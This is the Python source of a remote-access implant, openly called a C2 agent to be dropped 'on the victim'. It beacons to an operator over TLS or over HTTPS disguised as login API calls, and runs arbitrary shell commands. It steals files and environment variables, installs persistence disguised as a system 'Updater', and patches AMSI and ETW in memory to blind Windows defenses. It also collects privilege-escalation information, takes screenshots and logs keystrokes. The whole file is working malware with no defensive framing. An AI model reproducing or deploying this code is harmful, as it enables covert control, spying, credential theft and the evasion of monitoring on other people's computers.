#!/usr/bin/env python3
"""
C2 Agent — PURE PYTHON STANDARD LIBRARY ONLY.

No pip installs. No compiled binary. No external .pem file.
Just drop this one file on the victim and run it.

Encryption: TLS (AES-256-GCM via stdlib ssl).
Auth: SHA-256 cert pinning (prevents MITM).
"""
import argparse
import base64
import hashlib
import http.client
import json
import os
import platform
import random
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import threading
import time
import uuid

__version__ = "1.0.0"
PROTOCOL_VERSION = "1"

BEACON_INTERVAL = 5
JITTER = 0.3
RECONNECT_DELAY = 10

_state = {"keylog_listener": None, "keylog_path": None}


# ═══════════════════════════════════════════════════════════════════════
#  Framing helpers
# ═══════════════════════════════════════════════════════════════════════
def _recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        c = sock.recv(n - len(buf))
        if not c:
            return None
        buf += c
    return buf


def _recv_msg(sock):
    hdr = _recv_exact(sock, 4)
    if not hdr:
        return None
    n = struct.unpack(">I", hdr)[0]
    if n == 0 or n > 64 * 1024 * 1024:
        return None
    return _recv_exact(sock, n)


def _send_msg(sock, data):
    sock.sendall(struct.pack(">I", len(data)) + data)


def _cert_fp(sock):
    der = sock.getpeercert(binary_form=True)
    if not der:
        raise ssl.SSLError("no peer cert")
    return hashlib.sha256(der).hexdigest()


def _norm_fp(fp):
    if not fp:
        return ""
    return fp.lower().replace(":", "").replace("sha256:", "").strip()


def _j(s):
    return json.dumps(s, separators=(",", ":")).encode()


def _u(b):
    return json.loads(b.decode() if isinstance(b, bytes) else b)


# ═══════════════════════════════════════════════════════════════════════
#  Identity
# ═══════════════════════════════════════════════════════════════════════
def _machine_id():
    parts = [platform.node()]
    try:
        parts.append(str(uuid.getnode()))
    except Exception:
        pass
    parts.append(platform.machine())
    return hashlib.sha256("|".join(parts).encode()).hexdigest()[:16]


def _gather_info():
    return {
        "version": PROTOCOL_VERSION,
        "hostname": platform.node(),
        "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
        "os": platform.system(),
        "os_version": platform.version(),
        "arch": platform.machine(),
        "pid": os.getpid(),
        "machine_id": _machine_id(),
        "agent_version": __version__,
    }


# ═══════════════════════════════════════════════════════════════════════
#  Modules (all stdlib)
# ═══════════════════════════════════════════════════════════════════════
def _shell(cmd):
    try:
        if os.name == "nt":
            r = subprocess.run(["cmd.exe", "/c", cmd], capture_output=True,
                               text=True, timeout=180)
        else:
            r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True,
                               text=True, timeout=180)
        return (r.stdout or "") + (r.stderr or "") or "(no output)"
    except Exception as e:
        return f"[!] {e}"


def _ps():
    return _shell("tasklist" if os.name == "nt" else "ps aux")


def _env():
    return "\n".join(f"{k}={v}" for k, v in os.environ.items())


def _download(path):
    try:
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()
    except Exception as e:
        return f"[!] {e}"


def _upload(content_b64, remote):
    try:
        data = base64.b64decode(content_b64)
        with open(remote, "wb") as f:
            f.write(data)
        return f"[+] Wrote {len(data)} bytes -> {remote}"
    except Exception as e:
        return f"[!] {e}"


def _persist(kind):
    here = os.path.abspath(__file__)
    py = sys.executable or "python3"
    if os.name == "nt":
        kind = kind or "registry"
        if kind == "registry":
            return _shell(
                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                f'/v Updater /t REG_SZ /d "\\"{py}\\" \\"{here}\\"" /f')
        if kind == "startup":
            d = os.path.join(os.getenv("APPDATA", ""),
                             r"Microsoft\Windows\Start Menu\Programs\Startup")
            dst = os.path.join(d, "Updater.py")
            try:
                with open(here, "rb") as s, open(dst, "wb") as w:
                    w.write(s.read())
                return f"[+] Copied to {dst}"
            except Exception as e:
                return f"[!] {e}"
        if kind == "schtask":
            return _shell(
                f'schtasks /create /tn "Updater" /tr '
                f'"\\"{py}\\" \\"{here}\\"" /sc minute /mo 30 /f')
    if sys.platform == "darwin":
        plist = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.updater</string>
<key>ProgramArguments</key><array><string>{py}</string><string>{here}</string></array>
<key>RunAtLoad</key><true/>
<key>StartInterval</key><integer>600</integer>
</dict></plist>'''
        path = os.path.expanduser(
            "~/Library/LaunchAgents/com.apple.updater.plist")
        try:
            with open(path, "w") as f:
                f.write(plist)
            return _shell(f"launchctl load {path}")
        except Exception as e:
            return f"[!] {e}"

    kind = kind or "cron"
    if kind == "cron":
        line = f"*/10 * * * * {py} {here} # Updater\n"
        try:
            cur = subprocess.run(["crontab", "-l"],
                                 capture_output=True, text=True).stdout
            p = subprocess.run(["crontab", "-"], input=cur + line,
                               capture_output=True, text=True)
            return "[+] cron installed" if p.returncode == 0 else \
                f"[!] {p.stderr}"
        except Exception as e:
            return f"[!] {e}"
    if kind == "rc":
        try:
            with open(os.path.expanduser("~/.bashrc"), "a") as f:
                f.write(f"\n({py} {here} &) # Updater\n")
            return "[+] .bashrc updated"
        except Exception as e:
            return f"[!] {e}"
    if kind == "systemd":
        unit = (f"[Unit]\nDescription=System Updater\n[Service]\n"
                f"ExecStart={py} {here}\nRestart=always\nRestartSec=60\n"
                f"[Install]\nWantedBy=multi-user.target\n")
        path = os.path.expanduser(
            "~/.config/systemd/user/updater.service")
        try:
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as f:
                f.write(unit)
            return _shell(
                "systemctl --user enable --now updater.service")
        except Exception as e:
            return f"[!] {e}"
    return f"[!] unknown kind: {kind}"


def _privesc():
    out = []
    if os.name == "nt":
        out.append("=== whoami /priv ===\n" + _shell("whoami /priv"))
        out.append("=== whoami /groups ===\n" + _shell("whoami /groups"))
        out.append("=== systeminfo ===\n" +
                   _shell('systeminfo | findstr /B /C:"OS Name" '
                          '/C:"OS Version" /C:"Hotfix"'))
        out.append("=== unquoted service paths ===\n" +
                   _shell('wmic service get name,displayname,pathname,'
                          'startmode | findstr /i "auto"'))
        out.append("=== Temp ACL ===\n" +
                   _shell("icacls C:\\Windows\\Temp"))
    else:
        out.append("=== id ===\n" + _shell("id"))
        out.append("=== sudo -l ===\n" +
                   _shell("sudo -n -l 2>&1 || sudo -l 2>&1"))
        out.append("=== SUID binaries ===\n" +
                   _shell("find / -perm -4000 -type f 2>/dev/null | head -50"))
        out.append("=== kernel ===\n" + _shell("uname -a"))
        out.append("=== /etc/passwd, /etc/shadow ===\n" +
                   _shell("ls -l /etc/passwd /etc/shadow"))
        out.append("=== cron ===\n" +
                   _shell("ls -la /etc/cron* /var/spool/cron 2>/dev/null"))
    return "\n\n".join(out)


def _amsi():
    if os.name != "nt":
        return "[-] Windows only"
    try:
        import ctypes
        from ctypes import wintypes
        lib = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
        if not lib:
            return "[-] amsi.dll not loaded"
        addr = ctypes.windll.kernel32.GetProcAddress(
            lib, b"AmsiScanBuffer")
        if not addr:
            return "[-] AmsiScanBuffer not found"
        patch = b"\xB8\x57\x00\x07\x80\xC3"
        old = wintypes.DWORD()
        ctypes.windll.kernel32.VirtualProtect(
            addr, len(patch), 0x40, ctypes.byref(old))
        ctypes.memmove(addr, patch, len(patch))
        ctypes.windll.kernel32.VirtualProtect(
            addr, len(patch), old, ctypes.byref(old))
        return "[+] AMSI patched (AmsiScanBuffer -> E_INVALIDARG)"
    except Exception as e:
        return f"[!] {e}"


def _etw():
    if os.name != "nt":
        return "[-] Windows only"
    try:
        import ctypes
        from ctypes import wintypes
        is32 = platform.architecture()[0] == "32bit"
        ntdll = ctypes.windll.kernel32.LoadLibraryW("ntdll.dll")
        addr = ctypes.windll.kernel32.GetProcAddress(ntdll, b"EtwEventWrite")
        if not addr:
            return "[-] EtwEventWrite not found"
        patch = b"\x33\xC0\xC3" if is32 else b"\x48\x33\xC0\xC3"
        old = wintypes.DWORD()
        ctypes.windll.kernel32.VirtualProtect(
            addr, len(patch), 0x40, ctypes.byref(old))
        ctypes.memmove(addr, patch, len(patch))
        ctypes.windll.kernel32.VirtualProtect(
            addr, len(patch), old, ctypes.byref(old))
        return f"[+] ETW patched ({'32' if is32 else '64'}-bit)"
    except Exception as e:
        return f"[!] {e}"


def _screenshot():
    # Lazy imports — only needed if this module is used
    try:
        if sys.platform.startswith("linux"):
            import subprocess as sp
            for cmd in (["import", "-window", "root", "png:-"],
                        ["scrot", "-o", "-"]):
                try:
                    p = sp.run(cmd, capture_output=True, timeout=10)
                    if p.returncode == 0 and p.stdout:
                        return base64.b64encode(p.stdout).decode()
                except FileNotFoundError:
                    pass
        from PIL import ImageGrab
        import io
        buf = io.BytesIO()
        ImageGrab.grab().save(buf, format="PNG")
        return base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        return f"[!] screenshot needs pillow (pip install pillow): {e}"


def _keylog_start():
    if _state["keylog_listener"]:
        return "[*] already running"
    try:
        from pynput import keyboard
    except ImportError:
        return "[!] pynput not installed (pip install pynput)"
    path = os.path.join(tempfile.gettempdir(),
                        f".kl_{uuid.uuid4().hex[:8]}.log")
    f = open(path, "a", buffering=1)

    def on_press(key):
        try:
            f.write(key.char or "")
        except AttributeError:
            n = getattr(key, "name", None)
            if n:
                f.write(f"<{n}>")

    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()
    _state["keylog_listener"] = listener
    _state["keylog_path"] = path
    return f"[+] keylogger started -> {path}"


def _keylog_dump():
    p = _state.get("keylog_path")
    if not p or not os.path.exists(p):
        return "[-] no log"
    try:
        with open(p, "r", errors="ignore") as f:
            return f.read()[-100_000:] or "(empty)"
    except Exception as e:
        return f"[!] {e}"


def _keylog_stop():
    l = _state.get("keylog_listener")
    if l:
        try:
            l.stop()
        except Exception:
            pass
    _state["keylog_listener"] = None
    return "[*] stopped"


def _execute_task(task):
    cmd = task["command"]
    args = task.get("args") or {}
    try:
        if cmd == "shell":
            return _shell(args.get("command", ""))
        if cmd == "sysinfo":
            return json.dumps(_gather_info(), indent=2)
        if cmd == "ps":
            return _ps()
        if cmd == "env":
            return _env()
        if cmd == "download":
            return _download(args["path"])
        if cmd == "upload":
            return _upload(args["content"], args["remote"])
        if cmd == "persist":
            return _persist(args.get("kind", ""))
        if cmd == "privesc":
            return _privesc()
        if cmd == "amsi":
            return _amsi()
        if cmd == "etw":
            return _etw()
        if cmd == "screenshot":
            return _screenshot()
        if cmd == "keylog_start":
            return _keylog_start()
        if cmd == "keylog_dump":
            return _keylog_dump()
        if cmd == "keylog_stop":
            return _keylog_stop()
        return f"[!] unknown command: {cmd}"
    except Exception as e:
        return f"[!] {cmd}: {e}"


# ═══════════════════════════════════════════════════════════════════════
#  Transports
# ═══════════════════════════════════════════════════════════════════════
class TcpTlsTransport:
    def __init__(self, host, port, expected_fp):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        raw = socket.create_connection((host, port), timeout=30)
        self.sock = ctx.wrap_socket(raw, server_hostname=host)
        actual = _cert_fp(self.sock)
        if expected_fp and actual != expected_fp:
            self.sock.close()
            raise ssl.SSLError(
                f"cert fingerprint mismatch (got {actual[:16]}...)")
        self.sock.settimeout(60)

    def send(self, data):
        _send_msg(self.sock, data)

    def recv(self):
        return _recv_msg(self.sock)


class HttpsTransport:
    REGISTER_URI = "/api/v1/auth/login"
    BEACON_URI = "/api/v1/auth/refresh"
    RESULT_URI = "/api/v1/auth/verify"
    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

    def __init__(self, host, port, expected_fp):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        self.conn = http.client.HTTPSConnection(
            host, port, context=ctx, timeout=60)
        self.conn.connect()
        actual = _cert_fp(self.conn.sock)
        if expected_fp and actual != expected_fp:
            self.conn.close()
            raise ssl.SSLError(
                f"cert fingerprint mismatch (got {actual[:16]}...)")
        self.token = None

    def _post(self, path, data):
        headers = {
            "User-Agent": self.UA,
            "Content-Type": "application/octet-stream",
            "Accept": "application/json, text/plain, */*",
        }
        if self.token:
            headers["X-Agent-Token"] = self.token
        self.conn.request("POST", path, body=data, headers=headers)
        resp = self.conn.getresponse()
        return resp.status, resp.read()

    def register(self, info):
        status, body = self._post(self.REGISTER_URI, _j(info))
        if status != 200:
            raise RuntimeError(f"register HTTP {status}: {body[:200]}")
        return _u(body)

    def beacon(self, agent_id):
        status, body = self._post(self.BEACON_URI, _j({"type": "beacon"}))
        if status != 200:
            raise RuntimeError(f"beacon HTTP {status}")
        return _u(body)

    def submit(self, agent_id, result):
        self._post(self.RESULT_URI, _j(result))


# ═══════════════════════════════════════════════════════════════════════
#  Agent loop
# ═══════════════════════════════════════════════════════════════════════
def _loop_tcp(host, port, expected_fp):
    tr = TcpTlsTransport(host, port, expected_fp)
    info = _gather_info()
    tr.send(_j({"version": PROTOCOL_VERSION, "info": info}))
    raw = tr.recv()
    if not raw:
        raise RuntimeError("no registration response")
    ack = _u(raw)
    agent_id = ack["agent_id"]
    print(f"[*] registered {agent_id[:8]} via TCP+TLS")
    while True:
        jitter = 1.0 + random.uniform(-JITTER, JITTER)
        time.sleep(BEACON_INTERVAL * jitter)
        tr.send(_j({"type": "beacon"}))
        raw = tr.recv()
        if not raw:
            raise RuntimeError("disconnected")
        task = _u(raw)
        if task.get("type") == "noop":
            continue
        if task.get("type") == "task":
            print(f"[*] task: {task['command']}")
            output = _execute_task(task)
            tr.send(_j({"type": "result", "task_id": task["task_id"],
                        "output": output}))


def _loop_https(host, port, expected_fp):
    tr = HttpsTransport(host, port, expected_fp)
    ack = tr.register(_gather_info())
    agent_id = ack["agent_id"]
    tr.token = ack["token"]
    print(f"[*] registered {agent_id[:8]} via HTTPS")
    while True:
        jitter = 1.0 + random.uniform(-JITTER, JITTER)
        time.sleep(BEACON_INTERVAL * jitter)
        task = tr.beacon(agent_id)
        if task.get("type") == "noop":
            continue
        if task.get("type") == "task":
            print(f"[*] task: {task['command']}")
            output = _execute_task(task)
            tr.submit(agent_id, {"type": "result",
                                 "task_id": task["task_id"],
                                 "output": output})


# ═══════════════════════════════════════════════════════════════════════
#  Main
# ═══════════════════════════════════════════════════════════════════════
def main():
    ap = argparse.ArgumentParser(
        prog="agent",
        description="C2 agent (pure Python stdlib only).")
    ap.add_argument("--host", default="127.0.0.1",
                    help="server IP")
    ap.add_argument("--port", type=int, default=None,
                    help="server port (default 8443 for https, 4444 for tcp)")
    ap.add_argument("--transport", choices=["tcp", "https"],
                    default="https", help="transport (default https)")
    ap.add_argument("--cert-fp", default="",
                    help="SHA-256 fingerprint of server cert (hex)")
    ap.add_argument("--interval", type=int, default=BEACON_INTERVAL,
                    help=f"beacon interval seconds (default {BEACON_INTERVAL})")
    args = ap.parse_args()

    global BEACON_INTERVAL
    BEACON_INTERVAL = args.interval

    expected_fp = _norm_fp(args.cert_fp or os.environ.get("CERT_FP", ""))
    if not expected_fp:
        print("[!] No --cert-fp given. Either:")
        print("[!]   --cert-fp <hex>")
        print("[!]   export CERT_FP=<hex>")
        print("[!] Get the fingerprint from the server's startup banner.")
        sys.exit(1)

    port = args.port or (8443 if args.transport == "https" else 4444)

    delay = RECONNECT_DELAY
    while True:
        try:
            if args.transport == "tcp":
                _loop_tcp(args.host, port, expected_fp)
            else:
                _loop_https(args.host, port, expected_fp)
            delay = RECONNECT_DELAY
        except KeyboardInterrupt:
            print("[*] Exiting.")
            return
        except Exception as e:
            print(f"[!] {e} — retry in {delay}s")
            time.sleep(delay)
            delay = min(delay * 2, 300)


if __name__ == "__main__":
    main()
